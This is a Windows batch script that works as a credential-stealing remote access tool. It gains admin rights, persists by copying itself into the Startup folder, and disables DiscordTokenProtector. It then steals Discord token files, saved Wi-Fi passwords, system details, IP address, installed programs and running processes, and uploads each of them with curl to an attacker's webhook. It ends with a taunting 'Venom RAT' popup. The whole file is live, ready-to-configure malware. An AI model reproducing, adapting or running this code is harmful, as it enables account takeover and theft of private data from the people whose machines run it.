@echo off
setlocal enabledelayedexpansion


:: If not admin, relaunch the script with admin rights
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\GetAdmin.vbs"
    echo UAC.ShellExecute "%~0", "", "", "runas", 1 >> "%temp%\GetAdmin.vbs"
    "%temp%\GetAdmin.vbs"
    del "%temp%\GetAdmin.vbs"
    exit /B
)


:check_Permissions
    

    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto starti
    ) else (
       cls
       echo Failure: Please run the file again with Admin
       timeout 2 >NUL
       goto check_Permissions
    )

:starti

powershell -Command "Get-WmiObject Win32_PortConnector" >%localappdata%\Temp\antivm.txt
findstr /m "Port Connector" %localappdata%\Temp\antivm.txt 
if %errorlevel%==0 (
goto a
)

cls
del %localappdata%\Temp\antivm.txt
goto realstart

:a
del %localappdata%\Temp\antivm.txt
goto realstart 



:realstart

set "destination=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

copy "%~f0" "%destination%"

cd /d "%destination%"

:: Replace your webhook here so it sends the request or else it wont work!
set "webhook=YOUR HOOK HERE LOL"
set "rmpath=%userprofile%\AppData\Roaming\EvilBytecode"
::roaming path that where info will be stored in like sys and ip.

goto discordkill


:discordkill
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

::credits to baum for this make sure to check out his github
taskkill /im Discord.exe /f
taskkill /im DiscordTokenProtector.exe /f
cls
del %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe
del %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll
del %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat
cls
echo { >%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "auto_start": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "auto_start_discord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_allowbetterdiscord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkexecutable": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkhash": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkmodule": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkresource": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_checkscripts": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "integrity_redownloadhashes": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
cls
goto tokens


:ipnsys
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

cls
if not exist "!rmpath!" mkdir "!rmpath!"
for /f "delims=" %%i in ('powershell -Command "& { $env:COMPUTERNAME; $env:USERNAME; (Get-WmiObject Win32_VideoController).Caption; (Get-WmiObject Win32_Processor).Name; (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB; (Get-CimInstance Win32_ComputerSystemProduct).UUID }"') do (
    set "info=%%i"
    set "info=!info:"=!"
    echo !info!>> "!rmpath!\sys.txt"
)
powershell -Command "$response = Invoke-RestMethod -Uri 'https://ipinfo.io/json' -Method GET; $response.ip" > "!rmpath!\ip.txt"
curl -s -H "Expect: application/json" -F "file=@!rmpath!\sys.txt" %webhook% >NUL
curl -s -H "Expect: application/json" -F "file=@!rmpath!\ip.txt" %webhook% >NUL 
:: silent and nul so it doesnt show it sended request
del "!rmpath!\sys.txt"
del "!rmpath!\ip.txt"


goto extrainfo

:extrainfo
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

powershell -Command "Get-WmiObject -Query 'SELECT * FROM Win32_Product' | Select-Object Name | ForEach-Object { Write-Output $_.Name } | Out-File -FilePath '%rmpath%\installedprograms.txt' -Encoding UTF8"
powershell -Command "Get-Process | Select-Object Id, ProcessName | Format-Table -AutoSize | Out-File -FilePath '%rmpath%\runningprocesses.txt' -Encoding UTF8"


curl -s -H "Expect: application/json" -F "file=@%rmpath%\runningprocesses.txt" %webhook% >NUL
curl -s -H "Expect: application/json" -F "file=@%rmpath%\installedprograms.txt" %webhook% >NUL
del "!rmpath!\installedprograms.txt"
del "!rmpath!\runningprocesses.txt"
goto swap

:swap
echo hi
goto wifi

:wifi 
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
::credit to AleksaMCode on github for this, i just modified it a bit thanks :)
powershell -command "$Profiles=@(); $Profiles += (netsh wlan show profiles) | Select-String '\:(.+)$' | Foreach{ $_.Matches.Groups[1].Value.Trim() }; $res = $Profiles | Foreach{ $SSID=$_; (netsh wlan show profile name=\"$_\" key=clear) } | Select-String 'Key Content\W+\:(.+)$' | Foreach{ $pass=$_.Matches.Groups[1].Value.Trim(); $_ } | Foreach{ [PSCustomObject]@{ Wireless_Network_Name=$SSID; Password=$pass } } | Format-Table -AutoSize; $res | Out-File -FilePath '%rmpath%\wifipass.txt' -Encoding ASCII -Width 50"
curl -s -H "Expect: application/json" -F "file=@%rmpath%\wifipass.txt" %webhook% >NUL
del "!rmpath!\wifipass.txt"
goto sound


:tokens

if exist "C:\Users\%USERNAME%\AppData\Local\Temp\Discord\" (
    rmdir /s /q "C:\Users\%USERNAME%\AppData\Local\Temp\Discord\"
)
cls
:: thanks to overflow for this code, i havent made it lol, i just rewrited it to loop 5 times
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
set "source=%appdata%\discord"
set "source1=%appdata%\discord\Local Storage\leveldb" 
set "subdirectory=%temp%\Discord"
set "zipfile=%subdirectory%\DiscordFiles.zip"

if not exist "%subdirectory%" mkdir "%subdirectory%" >nul

for %%f in ("%source1%\*.log" "%source1%\*.ldb") do (
    copy "%%f" "%subdirectory%\" >nul
)

copy "%source%\Local State" "%subdirectory%\LocalState.txt" >nul

powershell Compress-Archive -Path "%subdirectory%\*" -DestinationPath "%zipfile%"
curl -F c=@"%zipfile%" %webhook%

::btw it zips up all etc, cuz its better for decryption bot you gotta all drop up
:: also its based rly on users connection..
goto ipnsys

:sound
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)

set "url=https://cdn.discordapp.com/attachments/1170689299394596885/1177487813088911411/Sex.mp3?ex=6572affb&is=65603afb&hm=62ceed0cf276db8051ce15886684389e80a3d21a3f4526d4462b13eba2ff192c&"
set "outputFile=%localappdata%\Temp\Sex.mp3"
curl -s -o "%outputFile%" "%url%" >NUL
(
  echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%outputFile%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo     wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000
) >sound.vbs
start /min sound.vbs
goto fakeerror


:fakeerror
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
set "err=You Got Logged ED, By Venom RAT."

(
    echo Set objShell = CreateObject^("WScript.Shell"^)
    echo objShell.Popup "%err%", 5, "Error", 48 + 1
) > "%temp%\err.vbs"

cscript //nologo "%temp%\err.vbs"
del "%temp%\err.vbs"
pause


endlocal
